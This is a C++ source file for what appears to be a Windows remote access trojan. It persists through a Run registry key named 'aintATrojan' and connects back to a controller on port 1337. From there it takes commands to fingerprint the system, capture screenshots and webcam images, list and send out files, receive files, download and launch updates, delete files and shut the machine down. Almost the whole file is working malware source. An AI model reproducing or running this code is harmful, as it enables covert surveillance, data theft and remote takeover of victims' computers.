#define _WINSOCKAPI_

#ifndef WIN32_LEAN_AND_MEAN
#define WIN32_LEAN_AND_MEAN
#endif

#define PORT 1337

#include <winsock2.h>
#include <ws2tcpip.h>
#include <windows.h>
#include <vfw.h>
#include <tchar.h>
#include <stdio.h>
#include <stdlib.h>
#include <intrin.h>
#include <iostream>
#include <string>
#include <sstream>

#pragma comment(lib, "Ws2_32.lib")
#pragma comment(lib, "Mswsock.lib")
#pragma comment(lib, "AdvApi32.lib")
#pragma comment(lib, "user32.lib")
#pragma comment(lib, "Gdi32.lib")
#pragma comment(lib, "Vfw32.lib")

unsigned int G_UID;
TCHAR ID[64];
OSVERSIONINFOEX info;
TCHAR exePath[MAX_PATH];

#include "net.h"
#include "fingerprint.h"
#include "fs.h"
#include "utils.h"

#define HKEY_PATH "Software\\Microsoft\\Windows\\CurrentVersion\\Run"

void addToBoot(TCHAR *szPath) {
  char regName[30] = "aintATrojan";
  HKEY newValue;
  RegOpenKey(HKEY_LOCAL_MACHINE, HKEY_PATH, &newValue);
  RegSetValueEx(newValue, regName, 0, REG_SZ, (LPBYTE)szPath, sizeof(szPath));
  RegCloseKey(newValue);
}

SOCKET sock;
void handle(char *buff, BOOL *listen, BOOL *loop) {
  std::string b(buff);
  std::string cmd = b.substr(0, b.find(':'));
  std::string args = b.substr(b.find(':') + 1);

  printf("\nCommand: %s  Args: %s\n", cmd.c_str(), args.c_str());


  if (cmd == "close") {
    *listen = FALSE;
    *loop = FALSE;

  } else if (cmd == "hi") {
    utils::fireHax0r();

  } else if (cmd == "systeminfo") {
    char str[256];
    sprintf(str, "{\"systeminfo\": {\"name\": \"%s\", \"version\": \"%d.%d b.%d\", \"os\": \"%s\", \"arch\": %d, \"payload\": \"%s\"}}",
        fingerprint::getMachineName(),
        info.dwMajorVersion,
        info.dwMinorVersion,
        info.dwBuildNumber,
        ID,
        fingerprint::is64bits() ? 64 : 32,
        PAYLOAD_VERSION);
    net::write(&sock, str);

  } else if (cmd == "screenshot") {
    char *ss = utils::TakeScreenShot((char*)"img.bmp");
    net::sendFile(&sock, (char*)"img.bmp");

  } else if (cmd == "ls") {
    struct fs::s_folder folder;
    fs::ls(&folder, (char*)args.c_str());

    std::string msg;
    msg += "{\"ls\": " + fs::serialize(&folder) + "}";
    net::write(&sock, (char*)msg.c_str());

  } else if (cmd == "download") {
    net::sendFile(&sock, (char*)args.c_str());

  } else if (cmd == "shutdown") {
    utils::shutdown();

  } else if (cmd == "webcam") {
    utils::captureWebcam((char*)"wc.bmp");
    net::sendFile(&sock, (char*)"wc.bmp");

  } else if (cmd == "incoming") {
    std::stringstream ss;
    ss.str(args);
    std::string sizeb;
    std::string path;
    std::getline(ss, sizeb, '^');
    std::getline(ss, path);

    unsigned int size = (unsigned int)atoi(sizeb.c_str());
    printf("\nTry download %d bytes in %s\n", size, path.c_str());
    net::recieveFile(size, (char*)path.c_str());

  } else if (cmd == "update") {
    std::stringstream ss;
    ss.str(args);
    std::string sizeb;
    std::string path;
    std::getline(ss, sizeb, '^');
    std::getline(ss, path);

    unsigned int size = (unsigned int)atoi(sizeb.c_str());
    printf("\nTry download update %d bytes in %s\n", size, path.c_str());
    net::recieveFile(size, (char*)path.c_str());
    utils::startup((char*)path.c_str());
    *listen = FALSE;
    *loop = FALSE;
  } else if (cmd == "rm") {
    printf("removing %", args.c_str());
    remove(args.c_str());
  }
}

int main() {
  // FreeConsole();
  G_UID = fingerprint::getUID();

  info = fingerprint::getOSInfo();
  fingerprint::reconOS(ID, &info);

  GetModuleFileName(NULL, exePath, MAX_PATH);
  // addToBoot(exePath);

  printf("Running in: %s\n", exePath);
  printf(" Bits: %d\n Major: %d\n Minor: %d\n Build: %d\n Platform: %d\n UID: %s\n ID: %s\n",
      fingerprint::is64bits() ? 64 : 32,
      info.dwMajorVersion,
      info.dwMinorVersion,
      info.dwBuildNumber,
      info.dwPlatformId,
      "",
      ID);


  BOOL run = TRUE;
  char buf[BUFFER_LENGTH];
  int buffc;

  while (run) {
    net::createSocket(&sock);
    if (net::connect(&sock) == 0) {

      net::listen(&sock, &run, &handle);
    }
    closesocket(sock);
    if (run) Sleep(5000);
  }
  net::close();
  


  // fingerprint::test();
  // fs::test();
  // net::test();

  return 0;
}
